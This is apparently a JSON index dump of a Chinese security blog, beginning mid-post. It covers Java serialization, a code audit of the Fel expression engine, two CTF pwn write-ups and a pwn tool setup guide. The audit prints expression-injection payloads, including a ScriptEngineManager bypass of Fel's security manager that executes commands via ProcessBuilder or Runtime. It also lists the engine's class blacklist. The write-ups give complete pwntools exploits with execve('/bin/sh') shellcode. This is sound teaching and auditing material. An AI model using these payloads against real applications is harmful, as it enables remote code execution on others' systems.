serialVersionUID可以显式声明，一般默认声明为1L；若不显式声明，则java序列化机制会根据Class自动生成一个serialVersionId 显式声明：public static final long serialVersionUID= 1L; 声明与否的几种情况 当不做显式声明时，会自动生成一个serialVersionUID 情况一：不做显式声明的实体类序列化后修改实体类再反序列化 结果：抛出异常Exception in thread &quot;main&quot; java.io.InvalidClassException: test.User; local class incompatible: stream classdesc serialVersionUID = 592275709804988011, local class serialVersionUID = -7989443708455138686 情况二：有显式声明的实体类序列化后修改实体类（减少属性）再反序列化 使用两个项目表示A端（序列化端）B端（反序列化端） A端的实体类User比B端多一个属性，其他均一致 结果：B端成功反序列化，执行了B端自己的toString()方法 左边为A端，右边为B端 控制台输出为各自序列化同一个字节流文件的结果，可以看到B端在缺少一个属性的情况下仍然序列化成功 情况三：有显示声明的实体类序列化后修改实体类（增加属性）再反序列化 和上面反过来，B端序列化，A端反序列化，A端比B端多一个属性 结果：A端成功反序列化，执行了自己的toString()，多的属性被赋了null初始值 左A右B，B序列化，A反序列化 情况四：任意一方没有显式声明 结果：抛出异常，因为没有声明的一方会自动生成一个serialVersionUID 定制序列化数据 当我们不需要把整个类的所有属性都序列化时可以自定义需要序列化的属性 12345678910111213private void writeObject(ObjectOutputStream s) throws IOException &#123; System.out.println(&quot;alice write&quot;); s.writeUTF(name); s.writeInt(id); s.writeUTF(sex);&#125; private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123; System.out.println(&quot;alice read&quot;); name = s.readUTF(); id = s.readInt(); sex = s.readUTF();&#125; 反序列化时会按照顺序读出属性的值，如果没有按顺序赋值也可以反序列化成功，但是属性的值会错乱 可以看到下面反序列化操作赋值顺序错乱，但是反序列化仍然会成功，只是赋值错乱而已 transient关键字 被transient修饰的属性不会被序列化 可以看到被transient修饰的aTransient反序列化后变为初始值null transient修饰name，单个写入也一样，还是无法被序列化","categories":[{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java反序列化","slug":"java反序列化","permalink":"https://vvmdx.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Fel代码审计","slug":"2021-08-11-Fel代码审计","date":"2021-08-10T16:00:00.000Z","updated":"2021-08-11T02:43:14.585Z","comments":true,"path":"2021/08/11/2021-08-11-Fel代码审计/","link":"","permalink":"https://vvmdx.github.io/2021/08/11/2021-08-11-Fel%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"Fel Fel介绍 Fel：Fast Expression Language，是一种开源表达式引擎，基于java1.5开发，适用java1.5及以上版本。 特点：如名所示：fast—快，每秒可执行千万次表达式，速度是Jexl-2.0的20倍以上。 下载地址：https://code.google.com/archive/p/fast-el/downloads Maven导入 12345&lt;dependency&gt; &lt;groupId&gt;org.eweb4j&lt;/groupId&gt; &lt;artifactId&gt;fel&lt;/artifactId&gt; &lt;version&gt;0.8&lt;/version&gt;&lt;/dependency&gt; 使用方法 基本算术表达式计算 12FelEngine felEngine = new FelEngineImpl();Object result1 = felEngine.eval(&quot;(5*6+10)/4&quot;); 使用变量/调用java方法 123456FelEngine felEngine = new FelEngineImpl();FelContext felContext = felEngine.getContext();// 将System.out赋值给&quot;test&quot;felContext.set(&quot;test&quot;, System.out);// 起到执行System.out.println()的作用felEngine.eval(&quot;test.println(&#x27;Hello world&#x27;.substring(6))&quot;); 自定义上下文/常见用法 自定义实体类 1234567891011121314151617181920212223242526272829// Student类public class Student &#123; private String name; private String id; private int age; private String sex; public Student() &#123; &#125; public Student(String name, String id, int age, String sex) &#123; this.name = name; this.id = id; this.age = age; this.sex = sex; &#125; @Override public String toString() &#123; return &quot;Student&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, id=&#x27;&quot; + id + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, sex=&#x27;&quot; + sex + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; ...&#125; Fel调用 12345678910// 创建表达式引擎对象FelEngine felEngine = new FelEngineImpl();// 创建Context设值对象FelContext felContext = felEngine.getContext();// 实例化Student对象Student student = new Student(&quot;vvmdx&quot;,&quot;13579&quot;,23,&quot;male&quot;);// Context对象设值，将student.toString()赋给stu变量felContext.set(&quot;stu&quot;, student.toString());// 执行表达式Object result = felEngine.eval(&quot;stu&quot;); 调用静态方法 通过$(‘class’).method的语法可以调用第三方类包、工具类、自定义类的方法，也可以创建对象，调用对象的方法 123456789// 调用工具类// 执行Math.min(1,2)FelEngine.instance.eval(&quot;$(&#x27;Math&#x27;).min(1,2)&quot;);// 调用第三方类// 执行Runtime.getRuntime().exec(&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;)FelEngine.instance.eval(&quot;$(&#x27;Runtime&#x27;).getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);// 调用自定义类// 执行new Student().toString()FelEngine.instance.eval(&quot;$(&#x27;test.Student.new&#x27;).toString()&quot;); 安全管理器 从0.8版本开始，为了防止“$&#123;System&#125;.exit(1)$”这样的表达式导致系统崩溃，Fel加入了安全管理器，对方法访问进行控制 123// 加入安全管理器后执行如下代码会抛出异常FelEngine.instance.eval(&quot;$(&#x27;Runtime&#x27;).getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);// 安全管理器[RegexSecurityMgr]禁止调用方法[public static java.lang.Runtime java.lang.Runtime.getRuntime()] 表达式解析 这里以FelEngine.instance.eval(&quot;$('Runtime').getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);为例，展示表达式解析的流程，以及安全管理器的过滤 语法树结构 Fel表达式语法树有3种节点 常量节点：ConstNode（包括类名、包名、方法内的固定参数等） 函数节点：FunNode（包括 +、-、*、/、$、.等操作符或者getRuntime()、exec()等方法） 变量节点：VarAstNode（若执行表达式((a+b)*c/d)，则其中a、b、c、d均为变量节点 以上节点都继承自AbstFelNode，所有组成表达式的元素都会被解析成节点 执行表达式 解析表达式：默认Antlr解析表达式（antlr-min-3.4.jar），生成AbstNode组成的语法树 节点解释：每种节点（常量、变量、函数）都有对应的解释器负责解释该节点 语法树执行顺序：按先序遍历执行（根→\\rightarrow→左→\\rightarrow→右） 获取class/创建对象 Fel中使用‘$’来获取class或创建对象 获取class：$(‘Runtime’)结果为java.lang.Runtime 函数调用栈如下 123AbstFelNode#eval -&gt;FunNode#interpret -&gt;Dollar#call -&gt; #isNew -&gt; #getClass -&gt; Class.forName() 创建对象：$(‘test.Student.new’)结果为new Student() 函数调用栈如下 123AbstFelNode#eval -&gt;FunNode#interpret -&gt;Dollar#call -&gt; #isNew -&gt; #newObject -&gt; Class.newInstance() Dollar.java部分关键代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Overridepublic Object call(FelNode node, FelContext context) &#123; String txt = getChildText(node); boolean isNew = isNew(txt); Class&lt;?&gt; cls = getClass(t xt, isNew); if (isNew) &#123; return newObject(cls); &#125; else &#123; return cls; &#125;&#125;// 通过forName反射获取class或创建对象// suffix = .newprivate Class&lt;?&gt; getClass(String txt, boolean isNew) &#123; String className = txt; if (isNew) &#123; className = className.substring(0, txt.length() - suffix.length()); &#125; if (className.indexOf(&quot;.&quot;) == -1) &#123; className = &quot;java.lang.&quot; + className; &#125; try &#123; Class&lt;?&gt; clz = Class.forName(className); return clz; &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return null;&#125;// new一个实例化对象private Object newObject(Class&lt;?&gt; cls) &#123; Object o = null; if (cls != null) &#123; try &#123; o = cls.newInstance(); &#125; catch (InstantiationException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; &#125; return o;&#125;// 判断是否为new创建对象private boolean isNew(String txt) &#123; boolean isNew = txt.endsWith(suffix); return isNew;&#125; 获取方法 Fel中通过点运算符获取方法 函数调用栈如下 12Dot#call -&gt; #findMethod -&gt;ReflectUtil#findMethod -&gt; Class.getMethods() 取方法代码如下 首先使用Class.getMethods()方法获取Class对象的方法集合 然后for循环逐个比较找出方法 返回finalMethod=public static java.lang.Runtime.getRuntime() 若方法不为空，则通过Method.invoke()调用方法 12345678910111213141516171819public static Method findMethod(Class&lt;?&gt; cls, String attr, Class&lt;?&gt;[] paramTypes) &#123; if (attr != null &amp;&amp; !&quot;&quot;.equals(attr)) &#123; String firstUpper = String.valueOf(attr.charAt(0)).toUpperCase() + attr.substring(1); Method[] methods = cls.getMethods(); Method finalMethod = null; String[] methodNames = new String[]&#123;attr, &quot;get&quot; + firstUpper, &quot;is&quot; + firstUpper&#125;; for (String methodName : methodNames) &#123; finalMethod = match(methodName, paramTypes, methods); if(finalMethod!=null)&#123; break; &#125; &#125; return finalMethod; &#125; else &#123; return null; &#125;&#125; 安全管理器 安全管理器中通过黑名单uncallableMap+白名单callableMap的方法来过滤 若方法在黑名单内，则返回false，无法访问 若白名单为空，则返回true 若方法在白名单内，返回true 1234567891011121314151617181920@Overridepublic boolean isCallable(Method m) &#123; String method = getSignature(m); if (isMatch(uncallableMap, method)) &#123; return false; &#125; if (callableMap.isEmpty()) &#123; return true; &#125; return isMatch(callableMap, method);&#125;// 判断input是否在Map m中private boolean isMatch(Map&lt;String, Pattern&gt; m, String input) &#123; for (Map.Entry&lt;String, Pattern&gt; entry : m.entrySet()) &#123; if (entry.getValue().matcher(input).find()) &#123; return true; &#125; &#125; return false;&#125; 跟踪数据流，可发现黑名单如下 java.lang.Runtime.* com.greenpineyu.fel.compile.* java.lang.Process.* java.io.File.* java.net.* com.greenpineyu.fel.security.* java.lang.System.* 黑名单配置位置位于com\\greenpineyu\\fel\\common\\FelBuilder.java处 12345678910111213141516171819public class FelBuilder &#123; /** * 构建安全管理器 * @return */ public static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); disables.add(System.class.getCanonicalName() + &quot;.*&quot;); disables.add(Runtime.class.getCanonicalName() + &quot;.*&quot;); disables.add(Process.class.getCanonicalName() + &quot;.*&quot;); disables.add(File.class.getCanonicalName() + &quot;.*&quot;); disables.add(&quot;java.net.*&quot;); disables.add(&quot;com.greenpineyu.fel.compile.*&quot;); disables.add(&quot;com.greenpineyu.fel.security.*&quot;); return new RegexSecurityMgr(null, disables); &#125; ...&#125; 执行系统命令 Fel执行系统命令有以下几种思路，但基于引擎本身执行的方法都不成功，不知道有没有其他方法 首先是Runtime.getRuntime，由于安全管理器的存在，这个方法在黑名单内，无法直接通过表达式解析使用， 由于Fel版本较老（2013年后就没有维护过），安全管理器的黑名单不够完善，没有禁用ProcessBuilder，可以尝试使用ProcessBuilder执行系统命令 创建恶意类使用反射 套娃，使用别的解析引擎来执行表达式 ProcessBuilder payload：felEngine.eval(&quot;$('ProcessBuilder').command(\\&quot;C:/Windows/System32/calc.exe\\&quot;).start()&quot;) 先说结论：暂时没有发现怎样通过表达式解析执行ProcessBuilder，原因主要有两种情况： 获取class Fel通过$(‘ProcessBuilder’)来获取ProcessBuilder类，而获取类使用的是Class.forName()，没有实例化为对象 获取类的方法如下 123456789101112131415161718private Class&lt;?&gt; getClass(String txt, boolean isNew) &#123; String className = txt; if (isNew) &#123; // suffix=&quot;.new&quot; isNew()用于判断类需不需要实例化 className = className.substring(0, txt.length() - suffix.length()); &#125; if (className.indexOf(&quot;.&quot;) == -1) &#123; // 若$(&#x27;Class&#x27;)中没有点运算符的话，则默认为java.lang.*的工具类 className = &quot;java.lang.&quot; + className; &#125; try &#123; Class&lt;?&gt; clz = Class.forName(className); // 获取类 return clz; &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return null;&#125; 继续往下看，获取到ProcessBuilder类后，会通过Class.getMethods()方法获取类方法，这个没什么问题，不展开 有类有方法后就会执行invoke()通过反射去执行类的方法，但是现在问题来了 我们知道method.invoke(Object)的作用是执行类或对象的方法 当method是一个静态方法时，invoke()需要一个类的参数 当method是一个实例方法时，invoke()需要一个类对象的参数 很明显，ProcessBuilder.command()是一个实例方法，而我们的传参却是类class java.lang.ProcessBuilder，这就会抛出object is not an instance of declaring class的异常 12345678public static Object invoke(Object obj, Method method, Object[] args) &#123; try &#123; return method.invoke(obj, args); &#125; catch (IllegalArgumentException var4) &#123; ... &#125; return null;&#125; 创建对象 前面获取类的路走不通，自然想到我们能不能自己通过表达式创建一个实例化对象 payload：felEngine.eval(&quot;$('ProcessBuilder.new').command(\\&quot;C:/Windows/System32/calc.exe\\&quot;).start()&quot;) $('ProcessBuilder.new')会在上面说的执行getClass()方法后执行以下方法 123456789101112131415// 传入的参数即为class java.lang.ProcessBuilderprivate Object newObject(Class&lt;?&gt; cls) &#123; Object o = null; if (cls != null) &#123; try &#123; // 使用newInstance()实例化 o = cls.newInstance(); &#125; catch (InstantiationException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; &#125; return o;&#125; 这段代码咋一看没什么问题，使用newInstance()实例化的效果和new也一样，但是这两者有个很关键的不同 newInstance()只能调用无参构造 但是**ProcessBuilder没有无参构造**！这就导致了执行时会抛出java.lang.InstantiationException: java.lang.ProcessBuilder的异常，罪魁祸首正是因为这个实例化用的是newInstance() 拓展 上面说到ProcessBuilder没有无参构造却依然可以使用ProcessBuilder processBuilder = new ProcessBuilder()实例化，主要是因为ProcessBuilder这个类有一个构造方法如下 12345public ProcessBuilder(String... command) &#123; this.command = new ArrayList&lt;&gt;(command.length); for (String arg : command) this.command.add(arg);&#125; 它使用了String... command这种不定参数的形式，当我们使用ProcessBuilder processBuilder = new ProcessBuilder()时，其实就相当于调用了这个构造方法，只是传入的参数为空，并不是无参构造 Runtime Fel有两种执行方式，一种是解释执行，即通过解析表达式来执行语句；一种是编译执行，用于海量数据的快速运算，无法执行获取类、方法等表达式 在解释执行中，表达式解析为java执行语句后，在invoke()执行方法前，会经过安全管理器检查，因此暂时没发现什么可以绕过的方法 安全检查的函数调用栈如下 123Dot.java#call -- 点运算符取方法 -&gt;#findMethod() -&gt;Method.getMethods()取方法 -&gt;#getCallableMethod() -- 调用安全管理器，若黑名单则抛出异常 创建恶意类 目前看来Fel只提供创建自定义类对象和调用工具类的api，并没有提供创建类的api 套娃 目前唯一一个能成功执行系统命令的方法，本质上并不是在Fel里解析执行的，而是使用了javax.script.ScriptEngineManager这个包 这个包用于js解析，它可以将js文本格式的代码封装后解析执行对应代码，由于这并没有经过Fel的解析，因此不会触发安全管理器的过滤，可以执行系统命令 1234// 使用ProcessBuilder执行系统命令FelEngine.instance.eval(&quot;$(&#x27;javax.script.ScriptEngineManager.new&#x27;).getEngineByName(&#x27;JavaScript&#x27;).eval(\\&quot;var x=new java.lang.ProcessBuilder; x.command(&#x27;calc.exe&#x27;); x.start()\\&quot;)&quot;);// 由于不经过Fel解析，因此Runtime也可以使用FelEngine.instance.eval(&quot;$(&#x27;javax.script.ScriptEngineManager.new&#x27;).getEngineByName(&#x27;JavaScript&#x27;).eval(\\&quot;var x=java.lang.Runtime.getRuntime(); x.exec(&#x27;calc.exe&#x27;)\\&quot;)&quot;); 防御 以下为安全管理器构建源码，可以看到默认只设置了黑名单，白名单默认为空，这里可以手动添加白名单作为过滤 1234567891011121314151617// common/FelBuilderpublic static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); disables.add(System.class.getCanonicalName() + &quot;.*&quot;); disables.add(Runtime.class.getCanonicalName() + &quot;.*&quot;); disables.add(Process.class.getCanonicalName() + &quot;.*&quot;); disables.add(File.class.getCanonicalName() + &quot;.*&quot;); disables.add(&quot;java.net.*&quot;); disables.add(&quot;com.greenpineyu.fel.compile.*&quot;); disables.add(&quot;com.greenpineyu.fel.security.*&quot;); return new RegexSecurityMgr(null, disables); // 白名单默认为空&#125;// security/RegexSecurityMgrpublic RegexSecurityMgr(Set&lt;String&gt; callables, Set&lt;String&gt; uncallables) &#123; convert(callables, this.callableMap); convert(uncallables, this.uncallableMap);&#125; 白名单添加方法 12345678910// common/FelBuilderpublic static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; callables = new HashSet&lt;String&gt;(); Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); callables.add(Math.class.getCanonicalName() + &quot;.*&quot;); ... disables.add(System.class.getCanonicalName() + &quot;.*&quot;); ... return new RegexSecurityMgr(callables, disables);&#125; 后记/总结 这个引擎不知道现在应用得多不多…毕竟从2013年后就没有维护了，由于该引擎加载类的特性（比如newInstance()在java9后就弃用了，改为使用构造器Constructor中getConstructor().newInstance()的方法进行反射，支持有参构造），如今常见的一些依赖反射和类加载形成的表达式注入其实都做不了，可能是因为代码比较老旧的原因吧，反而使得他更“安全”；同时由于不支持创建自定义类（没有loadClass()、ClassLoader()等）的原因，也封死了加载恶意类来注入这条路；引擎本身只支持加载已有的自定义类和java工具类，对于需要实例化对象却没有无参构造的类（比如ProcessBuilder），引擎并没有给出解决方案（没想到因为他的落后而显得安全（雾））；最后就是安全管理器，黑名单应该是搞不定的，，过滤规则是：“当白名单不为空时，优先根据白名单判断，不在白名单则抛出异常，当白名单为空时，根据黑名单判断，在黑名单内则抛出异常”，因此应该还是要设白名单的吧。","categories":[{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java表达式引擎","slug":"java表达式引擎","permalink":"https://vvmdx.github.io/tags/java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E/"}]},{"title":"CISCN_2019_s_9","slug":"2021-06-18-CISCN_2019_s_9","date":"2021-06-17T16:00:00.000Z","updated":"2021-08-16T14:11:51.758Z","comments":true,"path":"2021/06/18/2021-06-18-CISCN_2019_s_9/","link":"","permalink":"https://vvmdx.github.io/2021/06/18/2021-06-18-CISCN_2019_s_9/","excerpt":"","text":"CISCN_2019_s_9 程序逻辑 查看保护 32位，无任何保护 伪代码 pwn函数 fgets读取输入后直接输出 没有调用shellcode hint函数 jmp esp：跳转到esp执行 esp存放指向栈顶的指针 跳转后会去执行栈中的指令 调试 main处打断点，run后发现直接调用pwn函数，单步进入 gdb ciscn_s_9 b main r s 此时函数栈帧状态如下 进入pwn函数，首先是当前栈底ebp压栈，更新ebp为当前栈顶esp，然后开辟一块0x28的栈空间 push ebp mov ebp, esp sub esp, 0x28 打印字符串，跳过即可 获取数据流输入，写入栈 lea eax, [ebp+s] ; 把ebp+s的地址给eax push eax ; eax入栈 由于s被定义为-0x20，因此eax从ebp-0x20处(0x148)开始 构造一个’a’*0x20 + ‘b’*4的输入，发现’a’*0x20填满0x148~0x164，bbbb刚好覆盖ebp地址0x168 返回主函数 leave ; mov esp, ebp; pop ebp ret ; pop eip leave执行后栈帧如下 执行ret后，eip=0x804856f，回到返回地址，函数执行结束 hint函数 可以看到hint有一条跳转到esp的指令，由于栈上代码可执行，可以利用这个跳转到shellcode的位置 思路 在输入的时候可以把hint中的跳转指令的地址覆盖到0x16c即返回地址上，使得pwn函数在运行到ret时不会返回主函数，而是跳转到hint函数 ret到hint后会跳转到esp去执行我们的输入 由于pwn函数写入栈的位置为**[ebp+s]也即0x168-0x20=0x148的位置，而我们当前的esp位置为0x170**，因此需要把esp减去0x28使其能够刚好读到我们的输入 PWN 编写脚本 123456789101112131415161718192021222324252627from pwn import *context(os=&#x27;linux&#x27;)p = process(&#x27;./ciscn_s_9&#x27;)# p = remote(&#x27;node3.buuoj.cn&#x27;,26442) shellcode =&#x27;&#x27;&#x27;xor eax,eaxxor ecx,ecxxor edx,edxpush 0x0068732fpush 0x6e69622fmov ebx,espmov al,0xbint 0x80&#x27;&#x27;&#x27;shellcode = asm(shellcode)shell = &quot;sub esp, 0x28; call esp&quot;shell = asm(shell)p.recvuntil(&quot;&gt;\\n&quot;)payload = shellcode.ljust(0x24,b&quot;\\x90&quot;)payload += p32(0x8048554) #jmp esppayload += shellgdb.attach(p)p.sendline(payload)p.interactive() 可供shellcode的长度只有0x20 = 32个字节，因此不能用shellcraft.sh()，此处使用自己编写的shellcode \\x90为**NOP（空操作）**指令，为了对齐到双字边界（4的偶数倍） shellcode.ljust(0x24, b&quot;\\x90)即为使用\\x90（NOP指令）填充到0x168的位置，后面再接上0x8048554即jmp esp指令地址 执行效果 在0x0804854F打断点，发送payload后 可以看到此时return的地址已经被覆盖为hint中jmp esp的地址了，单步进入看到已经开始执行我们的shellcode 可以看到成功开启shell 完整代码执行效果如下","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"mrctf2020_shellcode","slug":"2021-06-14-mrctf2020_shellcode","date":"2021-06-13T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/14/2021-06-14-mrctf2020_shellcode/","link":"","permalink":"https://vvmdx.github.io/2021/06/14/2021-06-14-mrctf2020_shellcode/","excerpt":"","text":"mrctf2020_shellcode 程序逻辑 打印“Show me your magic！” 从buf中读取0x400字节的内容 eax存放读取的字节数，与0比较，大于0则跳转到loc_11D6，否则退出程序 12CMP leftOp, rightOpJG function ;大于跳转(left&gt;right) loc_11D6: 将写入的内容地址给rax，然后调用执行 PWN 查看保护 编写脚本 使用pwntools生成shellcode 12345678910from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = shellcraft.sh()payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 使用自己编写的shellcode 1234567891011121314151617181920from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = &#x27;&#x27;&#x27; mov rbx, 0x68732f6e69622f push rbx push rsp pop rdi xor esi, esi xor edx, edx push 0x3b pop rax syscall&#x27;&#x27;&#x27;payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 调试 断点打在call rax那 vmmap查看程序基址(0x55654d65e000) 加上偏移(0x11dd)就是call rax地址 打好断点后发送payload，可以发现已经断在call rax处 回到调试界面，s单步进入函数查看发现shellcode已经被写入函数 一直往下走，直到发现此时已经启动一个新程序**/bin/dash**，说明已经拿到shell 结果 使用pwntools生成的shellcode 使用自己编写的shellcode 单步进入函数后发现也成功写入 同样的也能启动**/bin/dash** 最终结果","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"PWN环境搭建及工具安装","slug":"2021-06-11-PWN环境搭建及工具安装","date":"2021-06-10T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/11/2021-06-11-PWN环境搭建及工具安装/","link":"","permalink":"https://vvmdx.github.io/2021/06/11/2021-06-11-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/","excerpt":"","text":"PWN 环境搭建 环境：Kali 2021 12sudo passwd # 添加root账号su root # 输入刚刚设置的密码，进入root python 3.9（Kali 2021自带） 配置更新源 12345678910mousepad /etc/apt/sources.list# 若mousepad报错，则apt install dbus-x11# mousepad就是记事本#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 升级软件列表/更新软件 123apt-get updateapt-get upgradeapt-get dist-upgrade git配置 1apt install git 工具安装 Pwntools 1234567# python3环境## 更新下载源apt-get upgrade## 安装pip下载工具apt install python3-pip## pip下载pwntoolspip3 install pwntools 下载完会得到两个小工具：checksec（查看保护机制）、ROPgadget one_gadget 功能：查找已知的libc中**exevce(&quot;/bin/sh&quot;)**语句的地址 安装 123456# 安装ruby环境apt install ruby# 安装ruby包管理工具apt install gem# 安装one_gadgetgem install one_gadget LibcSearcher https://github.com/IZAY01/LibcSearcher Libc database search https://libc.blukat.me/ main_arena_offset 堆、偏移 使用IDA Pro也可以做，但是手工做麻烦 https://github.com/bash-c/main_arena_offset GDB 动态分析 GNU项目调试器，用于在Linux系统中动态调试程序 1apt install gdb 增强工具：pwndbg、PEDA、gef 1234# 安装pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 安装完成后再使用gdb就会自动加载pwndbg","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"},{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"},{"name":"小工具&小脚本","slug":"小工具-小脚本","permalink":"https://vvmdx.github.io/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E5%B0%8F%E8%84%9A%E6%9C%AC/"},{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"},{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"},{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"自编工具&脚本","slug":"自编工具-脚本","permalink":"https://vvmdx.github.io/tags/%E8%87%AA%E7%BC%96%E5%B7%A5%E5%85%B7-%E8%84%9A%E6%9C%AC/"},{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"},{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://vvmdx.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java表达式引擎","slug":"java表达式引擎","permalink":"https://vvmdx.github.io/tags/java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E/"}]}